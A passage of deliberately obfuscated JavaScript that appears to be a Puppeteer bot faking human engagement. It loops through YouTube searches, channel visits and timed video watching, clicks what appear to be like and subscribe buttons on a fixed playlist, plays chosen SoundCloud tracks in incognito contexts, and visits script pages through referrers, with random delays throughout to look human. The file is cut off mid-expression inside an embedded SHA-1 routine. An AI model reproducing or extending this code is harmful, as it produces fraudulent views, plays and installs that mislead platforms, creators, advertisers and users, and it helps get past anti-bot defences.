const Z = c,
  Y = b,
  X = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xa6 * 0x8 + -0xe38 + 0x909))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x4f * -0x45 + -0x2045 + 0xafa), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1bab * -0x1 + 0x14f * -0x19 + 0x50c);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x2f95 + -0xb395 + -0x1f26 * -0x8 + (0x710c + -0x5d19 * -0x1 + -0x938d * 0x1) * random()) : await standardWaitForNetIdle(f), await wait(-0x2a2 * 0x7 + 0x25c7 + 0x1 * 0x2f + (-0x1 * -0x29d5 + -0x13c4 + -0x1 * -0x10ff) * random()), 0x11 * 0x167 + -0x66f * 0x1 + 0xf * -0x129;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1bab * -0x1 + 0x14f * -0x19 + 0x50c);
    let h = e[f];
    if (b['bpKsCb'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1b * -0xc7 + -0x2318 + 0xe1b * 0x1, s, t, u = 0x24f * -0x2 + -0x19 * 0x4e + 0x74 * 0x1b; t = n['charAt'](u++); ~t && (s = r % (-0x5f6 * 0x6 + -0x73 * 0x3b + 0x3e49) ? s * (-0x6d4 + 0x7ee + -0xda) + t : t, r++ % (0x4df * 0x2 + -0x1fce + -0x1d7 * -0xc)) ? p += String['fromCharCode'](0x226a + 0x2c * -0xe3 + 0x599 & s >> (-(0x7a * -0x40 + 0x1382 + -0x20 * -0x58) * r & -0x4fe + -0x1 * -0x1073 + 0x1 * -0xb6f)) : 0x1 * 0x35 + -0x22f9 + 0x22c4) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1126 + -0x1 * -0x16ed + 0x11 * -0x57, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x10 * 0x246 + 0x1e59 + 0x5 * -0xd55))['slice'](-(0x5 * -0x529 + -0x214c + 0x3b1b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2e3 * 0x5 + -0x5 * -0x6b6 + 0x37 * -0x59,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * -0x480 + 0xdd * 0x7 + -0x1 * 0xa8b; u < -0x5d5 * -0x2 + 0xa * -0x207 + 0x4 * 0x267; u++) {
          p[u] = u;
        }
        for (u = -0xa9b + -0x66e * 0x1 + 0x26f * 0x7; u < 0x208b + -0x25d * 0x7 + -0xf00; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x17a5 * 0x1 + 0x12f * 0x8 + 0x1 * -0x201d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x139 * -0x19 + -0xc66 * 0x1 + 0x2af7, q = -0x7 * -0x1ee + 0x1 * 0x1676 + 0x2 * -0x11fc;
        for (let v = -0x8bd + -0x15ec + -0x1 * -0x1ea9; v < n['length']; v++) {
          u = (u + (-0x31 * 0x65 + 0x36d * 0x1 + 0xfe9)) % (0x1ed9 + -0x2 * -0x687 + -0x2ae7), q = (q + p[u]) % (0xf99 + -0xdf * 0xd + -0x346), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1aa5 * 0x1 + -0x1 * 0x832 + -0x5d1 * 0x3)]);
        }
        return t;
      };
      b['NUEFDs'] = m, c = arguments, b['bpKsCb'] = !![];
    }
    const j = e[-0x3b3 * -0x8 + 0x1 * -0x407 + -0x1991],
      k = f + j,
      l = c[k];
    return !l ? (b['DMMxoT'] === undefined && (b['DMMxoT'] = !![]), h = b['NUEFDs'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x16fc + -0x1301 * 0x2 + -0xb * -0x752), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xa1 * 0x1 + 0x7 * 0x19f + -0xbf9;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1bab * -0x1 + 0x14f * -0x19 + 0x50c);
    let h = e[f];
    if (c['ywQDMe'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1b * -0xc7 + -0x2318 + 0xe1b * 0x1, r, s, t = 0x24f * -0x2 + -0x19 * 0x4e + 0x74 * 0x1b; s = m['charAt'](t++); ~s && (r = q % (-0x5f6 * 0x6 + -0x73 * 0x3b + 0x3e49) ? r * (-0x6d4 + 0x7ee + -0xda) + s : s, q++ % (0x4df * 0x2 + -0x1fce + -0x1d7 * -0xc)) ? o += String['fromCharCode'](0x226a + 0x2c * -0xe3 + 0x599 & r >> (-(0x7a * -0x40 + 0x1382 + -0x20 * -0x58) * q & -0x4fe + -0x1 * -0x1073 + 0x1 * -0xb6f)) : 0x1 * 0x35 + -0x22f9 + 0x22c4) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1126 + -0x1 * -0x16ed + 0x11 * -0x57, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x10 * 0x246 + 0x1e59 + 0x5 * -0xd55))['slice'](-(0x5 * -0x529 + -0x214c + 0x3b1b));
        }
        return decodeURIComponent(p);
      };
      c['yesxbm'] = i, b = arguments, c['ywQDMe'] = !![];
    }
    const j = e[-0x2e3 * 0x5 + -0x5 * -0x6b6 + 0x37 * -0x59],
      k = f + j,
      l = b[k];
    return !l ? (h = c['yesxbm'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function randomWait() {
  return await wait(0x18f5 + 0x12d9 + 0x1a * -0xef + (-0xb5f + 0xdc1 * -0x1 + 0x2ca8) * random()), 0x47 * 0x57 + 0x1 * -0xe12 + -0x1 * 0xa0e;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me'](R(0x2) + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x34 * -0x94 + -0xdd * -0x26 + -0x26b * 0x1a, 0x3 * 0x248 + 0xcc5 + -0x1396), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xde14 + 0x66c * 0x6 + -0x1c * -0xeed) * getRandomInt(-0x1ba9 + 0x9dc + 0x1 * 0x11cf, 0x1c1 * 0xd + 0xa * 0x253 + -0x2e06), h)), 0xc66 * -0x1 + 0x45f + 0x808;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x7 * -0x1ee + 0x1 * 0x1676 + 0x2 * -0x11fc;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x8bd + -0x15ec + -0x2 * -0xf55]['split']('\x20');
    for (let k = -0x31 * 0x65 + 0x36d * 0x1 + 0xfe8; k < i['length']; k += 0x1ed9 + -0x2 * -0x687 + -0x2be5)
      j += i[k] * h[i[k + (0xf99 + -0xdf * 0xd + -0x445)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1aa5 * 0x1 + -0x1 * 0x832 + -0x59 * 0x35)['map'](l => Array['from'](l['children']))[S(0x15)](-0x3b3 * -0x8 + 0x1 * -0x407 + -0x1990)['map'](l => l['childNodes'][0x14f0 * -0x1 + -0xd * -0x246 + -0x1b9 * 0x5]['childNodes'][0x2393 * -0x1 + -0x259 + 0xca4 * 0x3]['childNodes'][-0xc0d * -0x3 + -0x2c * 0x77 + -0xfb2]['childNodes'][0x4cd * 0x3 + -0x2 * 0x688 + -0x1 * 0x157]['childNodes'][-0x13c0 + 0xe7e + 0x543]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x4d + -0x26 * 0x107 + 0x2b3f, -0x12a7 + 0x116 + -0x2519 * -0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x978 + 0x29 * 0x186 + 0xef * 0x6);
  const h = await getMaxTime(f),
    i = Math['min']((-0x59 * 0x2ab + 0xcb4f + 0x46 * 0x3d6) * getRandomInt(0x54c + -0x1f20 + 0x19d6, -0x1a6d + 0x8ae * 0x1 + -0x11c4 * -0x1), h);
  return await wait(i), -0x10d7 + -0x11f3 * -0x1 + -0x11b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x549 + 0x31b + -0x2 * 0x432]['children'][-0x11ad * -0x1 + 0x1 * -0x245 + -0xf68]['children'][0x1f6 + -0x2 * 0x39c + 0x2a1 * 0x2]['children'][0x1 * -0x243a + 0x198a + 0xe4 * 0xc]['children'][-0x8 * -0x1a0 + 0x16a * -0x13 + 0xdde]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x22e2 + 0x15d1 + 0xe * 0xef;
}
async function searchAndView(f) {
  const T = d;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xb * -0x3 + -0xf1 * 0x1a + 0x18bd + (-0x2431 + -0xc01 + 0x3064) * random()
  }), await wait(0x3c8 * 0xa + 0x3ae + -0xd2e * 0x3 + (0x1792 * -0x1 + -0x971 + -0x3 * -0xb65) * random()), await f['click']('#search-ic' + T(0xe)), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xe7b + -0x17bb * 0x1 + 0x942]['childNodes'][0x10b8 + 0x11e0 + -0x2297]['childNodes'][0x1e94 + -0x1330 + -0x247 * 0x5]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x223 * -0x1 + 0xd * 0x262 + -0x846 * 0x4]['childNodes'][0x3 * -0x851 + 0x1679 + 0x27a]['childNodes'][-0x1085 * 0x1 + -0x779 * 0x1 + 0x1800]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xbd3 + -0x12d * -0x2 + 0x97a),
          r = 0x31f + 0x1 * -0x64c + 0x32d;
        for (let u = -0x28 * -0xe5 + 0x143f * 0x1 + -0x15 * 0x2ab; u < q['length']; u += 0x1 * 0x21d + 0x35f * 0x2 + -0x8d9)
          r += q[u] * k[q[u + (-0x15f1 * -0x1 + 0x11a0 + -0x2790)]];
        return r;
      }(n);
  });
  await wait((0x4e * 0x11f + -0x4cb1 + 0x2fd7) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x2443 * -0x2 + -0x6551 + -0x1 * -0x1072b) * getRandomInt(0x203f + -0x94 * -0x19 + -0x2eb2, 0x2 * -0xcf9 + 0x3 * 0xc80 + -0xb84), h + (0xfc * 0x25 + -0x2 * -0x125 + -0x997 * 0x2));
  return await wait(i), 0xb36 + -0x49 * -0x65 + 0x3 * -0xd56;
}

function a() {
  const br = [
    'F8kNs0uTxCkVFCkenG',
    'lxjLBw92zs1JBW',
    'ExqTy29Yzs1PBq',
    'RBSHAH4iWU',
    'CNrLCL9YzxnVDq',
    'ould-know-',
    'gM5AW5nSeCk4WReOAq',
    'close',
    'WRtcOCkttX7dNhGiW4hdGW',
    ',minecraft',
    'wc1syxrLtgLTAq',
    'WRXms8o1rCkwyq',
    'WRyspwC2rCoaW5ZdIh0',
    'lmorg3PEDNzxeSoF',
    'on-legacy',
    'WPbSW4VdUmkMW5ZdJ0eBWRC',
    'CMCVzw4VC2nYAq',
    'WOldICojW4PfWOldM8oXuSoo',
    'grecaptcha',
    'whatnot-de',
    'offsetPare',
    'zMXHDa',
    'cripts/by-',
    'ChNdQ8oTfgxdTW',
    'sg0XwuzZEKPxyG',
    'rgzRrgjgA194oq',
    'C2XPy2u',
    'AxrJB25Uzwn0zq',
    'yMm4rxKTDNvsnq',
    'create',
    'WPFdT8kA'
  ];
  a = function() {
    return br;
  };
  return a();
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xf * -0x23e + -0x2467 + 0x1 * 0x4609), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const U = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.[U(0x14) + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x595 * 0x1 + -0x14ba + -0x12b * -0x17 + (-0x2316 + 0x2599 + 0x165) * Math['random']());
    });
  }, -0x1424 * 0x1 + 0x2 * -0x7eb + 0x3f52);
  await wait(0x59 * 0x12db + -0x1 * -0x17a71 + -0x565 * 0xa4);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x17173 + 0x104d2 + -0x18be5) * getRandomInt(-0x1 * 0x46d + 0x21fc + 0x1 * -0x1d8b, 0x17c6 + -0x259 * -0xe + -0x388b)), clearInterval(h), 0xe13 + 0x1a49 + -0x285b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1156 + -0x205 * -0x9 + -0x2383;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x26d5 + 0x1f07 + -0x1 * -0x7cf;
    await randomWait();
  }
  return -0x4 * -0x7c7 + 0x1 * 0x79f + -0x26ba;
}

function fetchRandomSC() {
  const V = d;
  return Math['random']() <= -0x1 * 0x3cd + 0x8f * -0x23 + -0x3d * -0x62 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2110 + -0x37e + 0x248e + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + V(0x13) + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x4 * -0xa7 + -0x76 * -0x3c + -0x190c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x5d * 0x2a + 0x1 * 0x1b53 + -0x2a95 * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x11ae8 + -0x1db3 + -0x4d6d + getRandomInt(0x1 * -0x4ff2 + 0x2ed2 + -0x1258 * -0x5, -0x6b61 + -0x1 * -0xdecd + -0x1c4 * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * -0x70f + 0x3f1 * -0x1 + -0x3 * -0x3ab), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xaf3 + -0x1d * -0x89 + -0x5a * 0xd;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x13b6 + 0x23c8 + 0x377e * -0x1, -0x44 * 0x4c + 0x190c + -0x4aa)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x8 * -0x16b + -0x2 * -0xe49 + -0x201a + floor((0x22b5 + -0x14a5 + -0xa * 0x104) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x2 * 0x66231799 + -0x237ca7 * 0x5bc + -0x594b7f79 * -0x6),
          -0x1 * 0x204001 + 0x1 * -0x4707d + 0xa4b07e,
          -0xd350 + -0x4 * -0x2e47 + 0x22c * 0x47,
          0x209 * -0x4 + -0x14a6 + 0x1d4a
        ], y = [
          -0x11e5 + -0x137d + 0x2 * 0x12bd,
          -0x17 * -0x70 + -0x1 * -0x6eb + -0x10eb,
          -0x3 * 0xb5c + -0x1408 + 0x3624,
          -0x1195 * -0x1 + 0x1 * 0x923 + -0x1ab8
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x78 * 0x1d + -0xaf2 + 0x188b * 0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xe9 + 0x572 + -0x81 * 0x9; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1c0a + 0x4a * 0x2 + 0x26 * 0xb9) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x79 * 0x1 + -0x169a + -0x203 * -0xb] = A[0x11a6 + -0x79 * -0x21 + -0x1 * 0x212f] = A[-0x26c7 + 0x1d63 + -0x965 * -0x1] = A[-0xb6a * -0x1 + -0xa48 + -0x24 * 0x8] = A[-0xe6 + -0x207d + 0x2166] = A[0x3 * -0x3f + -0x2195 + 0x1 * 0x2256] = A[-0x1 * 0x1a1b + -0x7 * 0x209 + 0x285f] = A[0x16c9 + 0xfb * 0x17 + -0x2d50] = A[-0xe43 + -0x7fa * -0x1 + -0x8 * -0xca] = A[-0xd5 + -0xa16 + 0xaf3] = A[-0x1c56 + -0x1 * -0x118b + -0xe7 * -0xc] = A[-0x7 * -0x3a1 + 0x323 * -0x2 + -0x9 * 0x21f] = A[-0x19ad + -0x1e7c + 0x3834] = A[0x1da3 + 0x2669 + 0x2200 * -0x2] = A[-0x259a + 0xd04 + -0x77 * -0x35] = A[0xd * 0x28d + 0x19b9 + 0xa * -0x5e2] = A[0x9b9 + -0x1db * 0x1 + -0x7cf * 0x1] = -0x12a9 + -0xee7 + 0x2190, this['blocks'] = A) : this['blocks'] = [
                0x1d2b + -0x2 * 0x1237 + 0xa9 * 0xb,
                -0x1c5e + 0x2 * 0x102f + -0x1 * 0x400,
                0x1e * 0x12a + -0x3f * 0xf + -0xd * 0x267,
                -0x95 * -0xb + -0x15e1 + -0xf7a * -0x1,
                -0x11 * -0x13 + 0xb * -0xa7 + 0x5ea,
                -0x1 * 0x1dd9 + 0x387 + 0x463 * 0x6,
                0x1 * 0xb27 + 0x1c56 * -0x1 + -0x112f * -0x1,
                0x1c0d + -0xdb * 0x7 + -0x4 * 0x584,
                0x5 * -0x499 + 0x17b * 0x5 + 0xf96,
                -0xb9d + 0x22af + -0x1712,
                0x1 * 0x1aba + 0x2b7 * 0x1 + -0x1 * 0x1d71,
                -0xa * 0x24b + -0xc95 + 0x2383,
                -0x26a4 + 0xa8a + 0x95e * 0x3,
                -0x7b * 0x5 + 0xe31 + -0xbca,
                -0x7d0 + 0x158c + -0xdbc,
                0x103f * 0x1 + 0x1dc * 0x8 + -0x1 * 0x1f1f,
                -0x26b5 + -0x3 * 0xbfa + 0x84b * 0x9
              ], this['h0'] = -0x3 * 0x29326631 + 0x43ea6f68 + 0x9ef1e62c, this['h1'] = -0x18682b7b9 + 0x478ee6 * -0x64d + 0x4392fc270, this['h2'] = -0xa9bad * 0x1681 + 0xe5bc88d * 0x1 + 0x17918649e * 0x1, this['h3'] = 0x144fbf03 + -0x119e3 * 0xe71 + 0xbc96ca6, this['h4'] = -0x14c188b8b + -0x12e0a04ab + 0x33df57226, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x270d * 0x1 + 0x1 * -0x2057 + -0x2 * 0x35b, this['finalized'] = this['hashed'] = 0x175a + 0x287 * -0x5 + 0x1 * -0xab7, this['first'] = 0x295 * -0x4 + -0xa9 * -0x19 + -0x316 * 0x2;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x3e4 * -0x9 + 0x2302 + 0x1 * 0x2, O = J['length'] || -0x12 * -0x40 + 0xf9e + -0x32 * 0x67, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x4e9 + 0x17a1 + -0x1c8a, P[-0x1 * -0x67a + -0x43 * -0x8b + -0x1dd * 0x17] = this['block'], P[0x46 * -0x3f + -0x1f36 + -0xc2 * -0x40] = P[-0x2 * 0xf4d + -0xacb + 0x2966] = P[0x3 * -0x74f + 0x5fc + 0xff3 * 0x1] = P[-0x2 * 0x469 + 0x23 * -0xb5 + 0x2194] = P[0xfe1 + -0x2a8 * -0x1 + -0x1285] = P[0x3 * 0x895 + 0x279 * 0x9 + -0x47 * 0xad] = P[-0x954 + -0x2447 * 0x1 + 0x2da1 * 0x1] = P[0x1f6d + -0xc * 0x21a + -0x71 * 0xe] = P[0x13e9 + 0x826 + -0x1c07] = P[0x1116 + -0x1 * -0x258c + -0x3699] = P[-0x7d * -0x29 + -0x1 * -0xa1f + -0x1e1a] = P[-0x1b43 * 0x1 + -0xc * -0xe5 + 0x25e * 0x7] = P[-0x1c76 + -0x7 * 0x13c + 0x2526] = P[0x265 * -0x9 + -0x3 * 0x539 + 0x2545] = P[-0x1ad2 + -0x1a8 + 0x58 * 0x53] = P[-0x1254 + 0x21f1 + -0xf8e] = -0x67 * 0x57 + 0x43f + 0x1 * 0x1ec2), K) {
                    for (N = this['start']; M < O && N < 0x3 * 0x13 + 0xcdc + 0x1 * -0xcd5; ++M)
                      P[N >> 0x1 * -0x1cfa + -0x194 * -0x1 + 0x1b68] |= J[M] << y[0x1a4b + 0x15 * 0xe9 + -0x2d65 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x185 * 0xf + -0x785 + -0xf06; ++M)
                      (L = J['charCodeAt'](M)) < -0x2 * -0x252 + 0x1 * 0x2207 + -0x262b ? P[N >> 0x208c + 0x1719 + -0x37a3] |= L << y[0x2659 * -0x1 + -0x1b5b + -0x41b7 * -0x1 & N++] : L < -0xd93 + -0x67 * -0x36 + -0x3 * 0xd ? (P[N >> 0x9 * 0xf3 + -0x111 * 0x1b + 0x2 * 0xa21] |= (0x28f * 0x2 + 0xbd3 + -0x1031 | L >> -0x2032 + 0x10e7 * 0x2 + -0x196) << y[-0xbe * -0x2a + 0x22dd + -0x4206 & N++], P[N >> 0x240a + 0x1 * -0xa69 + -0x199f] |= (0xdf9 + 0x1cdd + -0x2a56 | -0x12fa + 0x1ada + 0x15 * -0x5d & L) << y[0x15bf + 0x649 * 0x1 + -0x1 * 0x1c05 & N++]) : L < -0x2743 + 0xf5a5 + -0x1 * -0x99e || L >= 0xc9b8 + 0x4eec + -0x7d * 0x74 ? (P[N >> -0xe4b + 0xb * -0x1a7 + 0x207a] |= (-0x228 + -0xdcd + 0x8b * 0x1f | L >> 0x1 * -0x5a5 + 0x1b + 0x596) << y[0x1610 + -0x1 * -0x2559 + -0x3b66 & N++], P[N >> -0x83e + 0xb51 + 0x5 * -0x9d] |= (-0x3 * -0x1f + -0x1d8 + -0x1 * -0x1fb | L >> -0x245b * -0x1 + 0x1 * 0x1124 + -0x3579 & 0x9 * -0x1d9 + -0x488 + 0xa * 0x224) << y[-0x1 * -0x9d5 + -0x1ce * -0xe + -0x2316 & N++], P[N >> 0x1bf * -0x16 + 0x9 * 0xfd + -0x1 * -0x1d87] |= (0x1 * 0x2578 + -0x87 * -0x1b + 0x3335 * -0x1 | -0x57f + -0x2 * -0x6c1 + 0x1f1 * -0x4 & L) << 